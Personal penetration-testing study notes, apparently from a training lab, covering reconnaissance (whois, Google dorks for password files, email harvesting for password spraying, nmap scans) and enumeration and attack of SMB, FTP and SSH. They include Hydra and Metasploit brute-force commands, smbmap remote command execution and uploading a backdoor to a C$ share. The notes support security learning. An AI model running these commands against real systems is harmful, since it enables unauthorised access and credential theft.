# Information gathering
#infogathering

## Passive info gathering (legal public info)
### website recon & footprinting:
whatis --> check the use of a function (eg whatis host)
host --> DNS lookup utility find the ip for given domain name

important directories to look for info:
/robots.txt --> used to specify directories that search engines web crawlers will disregard
/sitemap.xml --> provides search engines an organised way of indexing a site

wappalyzer --> used to see technologies used by site
whatweb --> tool to see check tech used by sites
webhttrack --> can be used to download and mirror unsecure sites

### whois Enumeration
--> gives bunch of info on site  (Admin/domain emails city/state address registrant contact etc)

### Netcraft
--> gather info about a domain (like whois,but also the technology like wappalyzer)
Note: VPN services like cloudflare means not all info is correct, some redacted by cloudflare

--> Exploit history can also be found 

### DNSrecon / DNS dumpster
--> dns info, mail server info

## WAF
wafwoof --> checks if a webapp is protected by firewall

### Google Dorks 
google tricks,
site:somesite.com --> search only the site
inurl:admin
intitle: index of --> common vulnerability of webservers not configured properly(directory is public)
site: "star".ine.com --> searches for subdomains
filetype: pdf, xls
inurl:auth_user_file.txt
inurl:passwd.txt

google hacking database --> gives some dork templates to search for vulnerable sites
waybackmachine....cool i guess?? to see old info possibly leaked 

### Email harvester
theharvester --> uses public info to find emails, hosts, ips, subdomains (works like netcraft etc)
eg:
theHarvester -d hacks.com -b bing,google,linkedin
Gather emails to password spray different account (when users reuse pwd for diff sites)

### Password Spray
haveibeenpwned.com --> use to see if email/number has been compromised 


## Active info gathering

### Zone Transfer
--> provides a good map of the network layout on the target network

DNS records:
A - ipv4
AAAA - ipv6
NS - reference to the domains nameserver
MX - dns to a mail server
CNAME - used for domain aliases
TXT - Text record
HINFO - displays host info
SOA - domain authority
SRV - service records
PTR - resolve ip to hostname (reverse DNS basically)

Tools:
dnsrecon -d {name of domain}
dnsenum
fierce -dns {domain name} ------> eg fierce -dns zonetransfer.me

sudo vim /etc/hosts --> "local" DNS records. List of hostnames and ip addr
	--> can add your router config ip with something like router.home.admin to make it searchable in browser
note: For zone transfer to work it must be enabled on the networks DNS server


### NMAP
Standard nmap stuff
gtk stuff:
-sn ping sweep
-Pn port scan w/o checking if host is alive (do this for windows systems as they usually block icmp reqs)
-F fast scan. only the top10o popular ports
-sC run some nmap scripts to identify more info about ports
-A aggressive scan. Uses -sV -sO and -sC
-T<0-5> speed up time of scan. Higher is faster
| T0       | T1     | T2     | T3     | T4         | T5     |
| -------- | ------ | ------ | ------ | ---------- | ------ |
| Paranoid | Sneaky | Polite | normal | Aggressive | Insane | 

-oN outputs to a new file.....(use it!!!)
-oX outputs into a XML format. Useful for metapsloit


# FootPrinting and Scanning

## ARP scan
arp-scan
eg:
sudo arp-scan -I tap0 -g 10.142.111.0/24
--> asks for the mac adresses of all the hosts connected to the subnet on interface tap0
--> note arp-scan doesnt show your own ip and mac address



## ICMP scan
-Ping
	-echo request...wait for reply
-fping (ping but for multiple)
eg:
	fping -I tap0 -g 10.142.111.0/24 -a
	--> outputs all hosts that are alive but includes the error messages.
	fping -I tap0 -g 10.142.111.0/24 -a 2>/dev/null
	--> redirects error (shown as output 2) to /dev/null blackhole
	--> note: stdin is 0, stdout is 1, stderr is 2
-Traceroute
-NMAP (uses more than just ICMP can check wireshark to see)
eg:
	nmap -sn 10.142.111.0/24
-zenmap (GUI version of NMAP)

IMPT: ARP and FPING shows different hosts alive sometimes as not all hosts replys to ping msgs

## Host discovery
--> nmap compares the hosts signature to a databse to guess the OS and services etc

--> NMAP scans for UDP are slow but can be sped up 
eg T5
Note Windows blocks certain icmp scans .... use  -Pn flag on nmap

GTK:
nmap UDP service scan -sUV
usually the open UDP ports are -p1-250 (a lot of guess work for the srervices tho)

# Enumeration
#services #enums 
## Servers and Services
A server is any computer that provides a service (a programme that give functionality)
Common services provided by servers: File sharing, Deliver/collect emails, host a website

File sharing : Server Message Block (SMB) ,Network File system(NFS)
File transfer (upload/download) :  File Transfer protocol (FTP) 
Command execution: Secure Shell Protocol (SSH)
Hyper text: HTTP
Database: MySQL, MSSQL

## SMB
Generic term: Common Internet File System (CIFS)
Windows implimentation of a file system
Common ports on windows machines: 135, 139, 445, 3389
SMB port: 445 and usually Netbios port: 139 is used to set up session for SMB
Version: Windows server etc
use NMAP -sC scripts to get more info

How its usually used:
```powershell
net use z: \\10.4.17.133\c$ smbserver_password /user:administrator
```
This adds the drive to windows network folder. Seen in windows file explorer as a shared drive.

To delete sessions
```powershell
net use * / delete
```
#### Nmap scripts for smb
checks for misconfigurations of SMB (using outdated versions/default configs etc)
Easily missed stuff
Note: p445 is where microsoft-ds smb is open on
```bash
nmap -p445 --script smb-protocols 10.4.31.2

nmap -p445 --script smb-security-mode 10.4.31.2
```
On example:
guest acct is accessible (let nmap log in as guest)
```bash
nmap -p445 --script smb-enum-sessions 10.4.31.2
```
log in using known creds (cmd shud be on one line to work)
```bash
nmap -p445 --script smb-enum-sessions --script-args smbusername=administrator,smbpassword=smbserver_771 10.4.31.2
```

Enumerate shares w/o and w authentication (files etc IPC null sessions also found here ):
```bash
nmap -p445 --script smb-enum-shares 10.4.31.2

nmap -p445 --script smb-enum-shares --script-args smbusername=administrator,smbpassword=smbserver_771 10.4.31.2

#list shares plus ls the directories found
nmap -p445 --script smb-enum-shares,smb-ls --script-args smbusername=administrator,smbpassword=smbserver_771 10.4.31.2

```

Enumerate users
```bash
nmap -p445 --script smb-enum-users --script-args smbusername=administrator,smbpassword=smbserver_771 10.4.31.2
```

Other info :
```bash
nmap -p445 --script smb-server-stats --script-args smbusername=administrator,smbpassword=smbserver_771 10.4.31.2

nmap -p445 --script smb-enum-domains --script-args smbusername=administrator,smbpassword=smbserver_771 10.4.31.2

nmap -p445 --script smb-enum-groups --script-args smbusername=administrator,smbpassword=smbserver_771 10.4.31.2

nmap -p445 --script smb-enum-services --script-args smbusername=administrator,smbpassword=smbserver_771 10.4.31.2
```

#### SMBmap
enumerate
```bash
smbmap -u guest -p "" -d . -H 10.4.26.58
smbmap -u administrator -p smbserver_771 -d . -H 10.4.26.58
```
RCE available
```bash
smbmap -u administrator -p smbserver_771 -d . -H 10.4.26.58 -x 'ipconfig'
#read the c drive (to also check if backdoor is dled)
smbmap -u administrator -p smbserver_771 -d . -H 10.4.26.58 -r 'C$'
#upload backdoor file from root folder to the c drive
smbmap -u administrator -p smbserver_771 -d . -H 10.4.26.58 --upload '/root/backdoor' 'C$\backdoor'
#download
smbmap -u administrator -p smbserver_771 -d . -H 10.4.26.58 --download 'C$\flag.txt'
```
#### Linux uses of SMB
version scan: Samba smbd

Metasploit scanner for smb
auxiliary/scanner/smb/smb_version

Some tools choose 1 get good
```bash
#Tool to enumerate groups, see which we can connect to (<20> means can connect with client) :
nmblookup -A 192.223.132.3

#check if there is a IPC null session
smbclient -L 192.223.132.3 -N

#Connect with emoty user name and no pass
rpcclient -U "" -N 192.223.132.3

#another tool to ind the OS, users and bunch of other stuff
enum4linux -o 192.76.243.3
enum4linux -u 192.76.243.3

#find if it uses smb2 using metasploit (useful info for later??)
auxiliary/scanner/smb/smb2
```
Connect to smb if null session exists (no authentication needed):
```bash
#conect without password null session
smbclient //192.4.17.3/Public -N

#if credentials found after cracking etc
smbclient //192.4.17.3/jane -U jane
smbclient //192.4.17.3/admin -U admin
#then enter password found
```
Cracking to enter without auth:
 metasploit
 ```bash
 auxiliary/scanner/smb/smb_login
 set rhost ....
 set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt
 #user found from enumeration
 set smbuser jane
```
Hydra
```bash
gzip -d /usr/share/wordlists/rockyou.txt.gz

hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.125.25.3 smb
```

Find pipes connected in a smb user
```msfconsole
use auxiliary/scanner/smb/pipe_auditor
```

Find sid of user
```bash
enum4linux -r -u"admin" -p "password1" 192.125.26.3
```

note: flag.tar.gz
use: "tar -xf flag.tar.gz" to unzip

## FTP
port: 21 
Connect
```bash
#default has no creds can try without anyt if not must bf
ftp 192.213.157.3
```
Hydra to get creds (long ass chunk)
```bash
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.213.157.3 ftp
```
Nmap to bf with a known user
```bash
#Save the username in a list
echo "sysadmin" > users
cat users
#should show "sysadmin" in there
nmap 192.213.157.3 --script ftp-brute --script-args userdb=/root/users -p 21
```

Easy Targets of FTP:
for older default implementations
FTP anon login --> "anonymous" user doesnt need password



## SSH
port: 22
interact with a remote shell over an encrypted channel
First determine if its windows or linux, linux always has root@192.12.11.2
Connect
```bash
ssh root@192.244.123.3
```
Some enums
```bash
nc 192.244.123.3 22
#might spit out the version of ssh but wont connect as its not the right protocol but good for enums

#shows all the algos that could have been used to create the ssh key
#what u want is that rsa key
nmap 192.244.123.3 -p 22 --script ssh2-enum-algos

#full rsa host key, save it for later
nmap 192.244.123.3 -p 22 --script ssh-hostkey --script-args ssh_hostkey=full

#check supported auth methods for the user student/admin, if none means no password
nmap 192.244.123.3 -p 22 --script ssh-auth-methods --script-args="ssh.user=student"
nmap 192.244.123.3 -p 22 --script ssh-auth-methods --script-args="ssh.user=admin"
```

hydra dictionary attack
```bash
hydra -l student -P usr/share/wordlists/rockyou.txt 192.244.123.3 ssh
```
nmap script attack
```bash
echo "administrator"> user
nmap 192.244.123.3 -p 22 --script ssh-brute --script-args userdb=/root/user
```
msfconsole
```msfconsole
use auxiliary/scanner/ssh/ssh_login
set ...
set userpass_file /user/share/wordlists/metasploit/root_userpass.txt
set STOP_ON_SUCCESS true
```
## HTTP


## SQL
